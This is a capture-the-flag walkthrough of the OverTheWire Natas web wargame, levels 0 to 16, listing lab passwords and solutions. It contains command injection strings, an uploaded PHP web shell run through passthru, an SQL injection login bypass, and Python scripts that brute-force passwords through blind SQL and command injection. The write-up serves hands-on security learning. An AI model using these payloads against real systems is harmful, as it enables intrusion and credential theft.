# Web
## Natas Wargame
* level 0
  * Username: natas0
  * Password: natas0
  * [URL] (http://natas0.natas.labs.overthewire.org)
  
* level 1
  * While seeing the source code we find the flag as comment.
  * The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto

* level 2
  * While seeing the source code we find the flag as comment.
  * The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
 
* level 3
  * In source code we find a png file containing a pixel, so opening it's directory gives us the user.txt file containing flag.
  * natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

* level 4
  * While seeing the source code we find the flag as comment.
  * natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

* level 5
  * The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
  * Installed burp suit & foxy proxy and referrer was changed to natas5 in url the refresh gives the flag.

* level 6
  * The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
  * again in burpsuit the value of 0 turned to 1

* level 7
  * $secret = "FOEIUWGHFEEUHOFUOIU"; entering this gives
  * Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 

* level 8
  * natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
  * view the link given source code.
  * encodedSecret = "3d3d516343746d4d6d6c315669563362";
  * DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
  ```php
  PHP CODE:<?
  print base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
  ?> 
  ```
  * OUTPUT: oubWYf2kBq

* level 9
  * Access granted.The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
  * ;ls  ;cat /etc/natas_webpass/natas10    giving this in the field and searching gives us  nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

* level 10
  * .* /etc/natas_webpass/natas11 #   when given in the search gives us the password.
  * /etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

* level 11
  * The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
  ```php
  <?
  $key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sF0cIaAw');
  $text = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
  $outText = ''; 
  // Iterate through each character
  for($i=0;$i<strlen($text);$i++) {
  $outText .= $text[$i] ^ $key[$i % strlen($key)];}
  print $outText;
  ?>
  ```
  * Output:  qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq!nJq
  ```php
  <?
  $key = 'qw8J';
  $text = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
  $outText = '';
  // Iterate through each character
  for($i=0;$i<strlen($text);$i++) {
  $outText .= $text[$i] ^ $key[$i % strlen($key)];}
  print base64_encode($outText);
  ?>
  ```
  * Output:  ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK

* level 12
  * create an xyz.php file with contents as:
  ```php
  <?
  passthru($_GET['cmd']);
  ?>
  ```
  * Uploaded this file, checked the vulnerabilities using burpsuit, set the file as .php
  * gave request as ---->  http://natas12.natas.labs.overthewire.org/upload/gcblmhl9mz.php?cmd=cat%20/etc/natas_webpass/natas13
  * jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 

* level 13
  * create an ab.php file with contents as:
  ```php
  <?
  passthru($_GET['cmd']);
  ?>
  ```
  * Using hex editor did mention spaces FF D8 FF E0
  * Uploaded this file, checked the vulnerabilities using burpsuit, set the file as .php
  * gave request as ---->  http://natas12.natas.labs.overthewire.org/upload/gcblmhl9mz.php?cmd=cat%20/etc/natas_webpass/natas14
  * ����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

* level 14
  * sqli injection
  * Username and password given as: " or "1"="1
  * Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

* level 15
  * create a python script
  ```py
  import requests
  import sys
  from string import digits, ascii_lowercase, ascii_uppercase

  url = "http://natas15.natas.labs.overthewire.org/"
  charset = ascii_lowercase + ascii_uppercase + digits
  sqli = 'natas16" AND password LIKE BINARY "'

  s = requests.Session()
  s.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

  password = ""
  while len(password) < 32:
    for char in charset:
        r = s.post('http://natas15.natas.labs.overthewire.org/', data={'username':sqli + password + char + "%"})
        if "This user exists" in r.text:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
  ```
  * Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

* level 16
  * create a python script
  ```py
  import requests
  import sys
  from string import digits, ascii_lowercase, ascii_uppercase

  charset = ascii_lowercase + ascii_uppercase + digits
  s = requests.Session()
  s.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

  password = ""
  while len(password) < 32:
    for char in charset:
        payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}
        r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload)

        if len(r.text) == 1105:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
  ```
  * Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq 
